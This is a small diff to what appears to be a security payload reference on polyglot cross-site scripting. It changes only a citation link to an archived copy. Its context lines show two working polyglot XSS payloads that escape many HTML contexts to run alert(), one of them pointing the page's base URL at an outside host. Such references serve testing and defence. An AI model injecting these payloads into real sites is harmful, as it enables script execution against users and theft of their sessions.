@@ -74,7 +74,7 @@ A polyglot XSS is a type of cross-site scripting (XSS) payload designed to work 
     javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
     ```
 
-* Polyglot XSS - from [brutelogic](https://brutelogic.com.br/blog/building-xss-polyglots/)
+* Polyglot XSS - from [brutelogic](https://web.archive.org/web/20210623151016/https://brutelogic.com.br/blog/building-xss-polyglots/)
 
     ```javascript
     JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->
